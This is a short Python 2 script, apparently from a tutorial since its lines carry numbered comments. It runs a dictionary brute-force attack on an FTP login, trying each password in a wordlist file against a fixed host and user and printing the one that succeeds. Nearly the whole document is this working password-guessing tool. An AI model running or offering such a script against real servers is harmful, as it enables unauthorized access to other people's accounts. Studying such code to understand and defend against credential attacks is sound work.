from ftplib import FTP

wordlist = open('wordlist.txt', 'r')                  #(1)
user_login = "server"

def getPassword(password):                            #(2)
    try:
        ftp = FTP("server")                           #(3)
        ftp.login(user_login,password)                #(4)
        print "user password:", password
        return True
    except Exception:                                 #(5)
        return False    

passwords = wordlist.readlines()
for password in passwords:      
    password = password.strip()
    print "test password:", password
    if(getPassword(password)):                        #(6)
        break
wordlist.close()
